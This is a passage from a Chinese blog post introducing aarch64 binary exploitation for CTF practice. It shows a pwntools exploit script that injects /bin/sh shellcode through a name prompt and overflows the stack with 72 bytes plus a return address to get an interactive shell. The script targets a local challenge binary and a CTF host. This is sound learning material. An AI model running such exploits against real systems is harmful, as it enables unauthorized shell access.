class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_str</span>(<span class="params">b</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        s += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,s)))</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:        </span><br><span class="line">    <span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] # uncomment this if you use tmux</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&quot;aarch64&quot;</span></span><br><span class="line">    <span class="comment"># functions for quick script</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    slt     = <span class="keyword">lambda</span> delim,data         :ctx.sendlinethen(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    dbg     = <span class="keyword">lambda</span> *args, **kwargs    :ctx.debug(*args, **kwargs)</span><br><span class="line">    <span class="comment"># misc functions</span></span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">        ctx.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">        ctx.remote_libc = <span class="string">&#x27;/usr/aarch64-linux-gnu/lib/libc-2.31.so&#x27;</span></span><br><span class="line">        libc = ctx.remote_libc</span><br><span class="line">        ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">        rs(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26879</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">        rs(<span class="string">&#x27;remote&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    shellcode=asm(shellcraft.aarch64.linux.sh(),arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">    print(shellcraft.aarch64.linux.sh())</span><br><span class="line">    ru(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    sl(bytes_to_str(shellcode))</span><br><span class="line">    print(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">    <span class="comment"># payload = cyclic(0x200)</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span>*<span class="number">72</span> + p64(<span class="number">0x411068</span>)</span><br><span class="line">    sl(bytes_to_str(payload))</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>
<p>自动化找偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 和 cyclic_find 的功能来查找偏移</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/05/19/ARM-aarch64-PWN入门/">http://example.com/2021/05/19/ARM-aarch64-PWN入门/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ARM/">ARM</a><a class="post-meta__tags" href="/tags/aarch64/">aarch64</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/05/20/m0leConCTF2021%E9%80%86%E5%90%91Automatic-Rejection-Machine%E9%A2%98%E8%A7%A3/"><i class="fa fa-chevron-left">  </i><span>m0leConCTF2021逆向Automatic Rejection Machine题解</span></a></div><div class="next-post pull-right"><a href="/2021/05/19/m0leConCTF2021%E9%80%86%E5%90%91Parallel-The-M0le%E9%A2%98%E8%A7%A3/"><span>m0leConCTF2021逆向Parallel-The-M0le题解</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>